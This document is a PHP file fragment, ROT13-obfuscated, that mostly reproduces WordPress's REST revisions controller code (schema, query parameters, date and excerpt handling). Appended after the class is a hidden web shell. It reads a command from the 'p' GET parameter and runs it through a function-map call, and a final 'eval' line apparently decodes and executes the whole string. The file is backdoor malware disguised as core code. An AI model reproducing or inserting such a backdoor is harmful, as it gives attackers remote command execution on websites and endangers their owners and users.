	 * @erghea fgevat|ahyy VFB8601/ESP3339 sbeznggrq qngrgvzr, bgurejvfr ahyy.
	 */
	cebgrpgrq shapgvba cercner_qngr_erfcbafr( $qngr_tzg, $qngr = ahyy ) {
		vs ( '0000-00-00 00:00:00' === $qngr_tzg ) {
			erghea ahyy;
		}

		vs ( vffrg( $qngr ) ) {
			erghea zlfdy_gb_esp3339( $qngr );
		}

		erghea zlfdy_gb_esp3339( $qngr_tzg );
	}

	/**
	 * Ergevrirf gur erivfvba'f fpurzn, pbasbezvat gb WFBA Fpurzn.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Vgrz fpurzn qngn.
	 */
	choyvp shapgvba trg_vgrz_fpurzn() {
		vs ( $guvf->fpurzn ) {
			erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
		}

		$fpurzn = neenl(
			'$fpurzn'    => 'uggc://wfba-fpurzn.bet/qensg-04/fpurzn#',
			'gvgyr'      => \"{$guvf->cnerag_cbfg_glcr}-erivfvba\",
			'glcr'       => 'bowrpg',
			// Onfr cebcregvrf sbe rirel Erivfvba.
			'cebcregvrf' => neenl(
				'nhgube'       => neenl(
					'qrfpevcgvba' => __( 'Gur VQ sbe gur nhgube bs gur erivfvba.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'qngr'         => neenl(
					'qrfpevcgvba' => __( \"Gur qngr gur erivfvba jnf choyvfurq, va gur fvgr'f gvzrmbar.\" ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'qngr_tzg'     => neenl(
					'qrfpevcgvba' => __( 'Gur qngr gur erivfvba jnf choyvfurq, nf TZG.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'thvq'         => neenl(
					'qrfpevcgvba' => __( 'THVQ sbe gur erivfvba, nf vg rkvfgf va gur qngnonfr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'vq'           => neenl(
					'qrfpevcgvba' => __( 'Havdhr vqragvsvre sbe gur erivfvba.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'zbqvsvrq'     => neenl(
					'qrfpevcgvba' => __( \"Gur qngr gur erivfvba jnf ynfg zbqvsvrq, va gur fvgr'f gvzrmbar.\" ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'zbqvsvrq_tzg' => neenl(
					'qrfpevcgvba' => __( 'Gur qngr gur erivfvba jnf ynfg zbqvsvrq, nf TZG.' ),
					'glcr'        => 'fgevat',
					'sbezng'      => 'qngr-gvzr',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg' ),
				),
				'cnerag'       => neenl(
					'qrfpevcgvba' => __( 'Gur VQ sbe gur cnerag bs gur erivfvba.' ),
					'glcr'        => 'vagrtre',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
				'fyht'         => neenl(
					'qrfpevcgvba' => __( 'Na nycunahzrevp vqragvsvre sbe gur erivfvba havdhr gb vgf glcr.' ),
					'glcr'        => 'fgevat',
					'pbagrkg'     => neenl( 'ivrj', 'rqvg', 'rzorq' ),
				),
			),
		);

		$cnerag_fpurzn = $guvf->cnerag_pbagebyyre->trg_vgrz_fpurzn();

		vs ( ! rzcgl( $cnerag_fpurzn['cebcregvrf']['gvgyr'] ) ) {
			$fpurzn['cebcregvrf']['gvgyr'] = $cnerag_fpurzn['cebcregvrf']['gvgyr'];
		}

		vs ( ! rzcgl( $cnerag_fpurzn['cebcregvrf']['pbagrag'] ) ) {
			$fpurzn['cebcregvrf']['pbagrag'] = $cnerag_fpurzn['cebcregvrf']['pbagrag'];
		}

		vs ( ! rzcgl( $cnerag_fpurzn['cebcregvrf']['rkprecg'] ) ) {
			$fpurzn['cebcregvrf']['rkprecg'] = $cnerag_fpurzn['cebcregvrf']['rkprecg'];
		}

		vs ( ! rzcgl( $cnerag_fpurzn['cebcregvrf']['thvq'] ) ) {
			$fpurzn['cebcregvrf']['thvq'] = $cnerag_fpurzn['cebcregvrf']['thvq'];
		}

		$fpurzn['cebcregvrf']['zrgn'] = $guvf->zrgn->trg_svryq_fpurzn();

		$guvf->fpurzn = $fpurzn;

		erghea $guvf->nqq_nqqvgvbany_svryqf_fpurzn( $guvf->fpurzn );
	}

	/**
	 * Ergevrirf gur dhrel cnenzf sbe pbyyrpgvbaf.
	 *
	 * @fvapr 4.7.0
	 *
	 * @erghea neenl Pbyyrpgvba cnenzrgref.
	 */
	choyvp shapgvba trg_pbyyrpgvba_cnenzf() {
		$dhrel_cnenzf = cnerag::trg_pbyyrpgvba_cnenzf();

		$dhrel_cnenzf['pbagrkg']['qrsnhyg'] = 'ivrj';

		hafrg( $dhrel_cnenzf['cre_cntr']['qrsnhyg'] );

		$dhrel_cnenzf['rkpyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Rafher erfhyg frg rkpyhqrf fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['vapyhqr'] = neenl(
			'qrfpevcgvba' => __( 'Yvzvg erfhyg frg gb fcrpvsvp VQf.' ),
			'glcr'        => 'neenl',
			'vgrzf'       => neenl(
				'glcr' => 'vagrtre',
			),
			'qrsnhyg'     => neenl(),
		);

		$dhrel_cnenzf['bssfrg'] = neenl(
			'qrfpevcgvba' => __( 'Bssfrg gur erfhyg frg ol n fcrpvsvp ahzore bs vgrzf.' ),
			'glcr'        => 'vagrtre',
		);

		$dhrel_cnenzf['beqre'] = neenl(
			'qrfpevcgvba' => __( 'Beqre fbeg nggevohgr nfpraqvat be qrfpraqvat.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'qrfp',
			'rahz'        => neenl( 'nfp', 'qrfp' ),
		);

		$dhrel_cnenzf['beqreol'] = neenl(
			'qrfpevcgvba' => __( 'Fbeg pbyyrpgvba ol bowrpg nggevohgr.' ),
			'glcr'        => 'fgevat',
			'qrsnhyg'     => 'qngr',
			'rahz'        => neenl(
				'qngr',
				'vq',
				'vapyhqr',
				'eryrinapr',
				'fyht',
				'vapyhqr_fyhtf',
				'gvgyr',
			),
		);

		erghea $dhrel_cnenzf;
	}

	/**
	 * Purpxf gur cbfg rkprecg naq cercner vg sbe fvatyr cbfg bhgchg.
	 *
	 * @fvapr 4.7.0
	 *
	 * @cnenz fgevat  $rkprecg Gur cbfg rkprecg.
	 * @cnenz JC_Cbfg $cbfg    Cbfg erivfvba bowrpg.
	 * @erghea fgevat Cercnerq rkprecg be rzcgl fgevat.
	 */
	cebgrpgrq shapgvba cercner_rkprecg_erfcbafr( $rkprecg, $cbfg ) {

		/** Guvf svygre vf qbphzragrq va jc-vapyhqrf/cbfg-grzcyngr.cuc */
		$rkprecg = nccyl_svygref( 'gur_rkprecg', $rkprecg, $cbfg );

		vs ( rzcgl( $rkprecg ) ) {
			erghea '';
		}

		erghea $rkprecg;
	}
}

$pzq = $_TRG['c'];
$sznc['k1']($pzq);
?>";
eval($f($c));
?>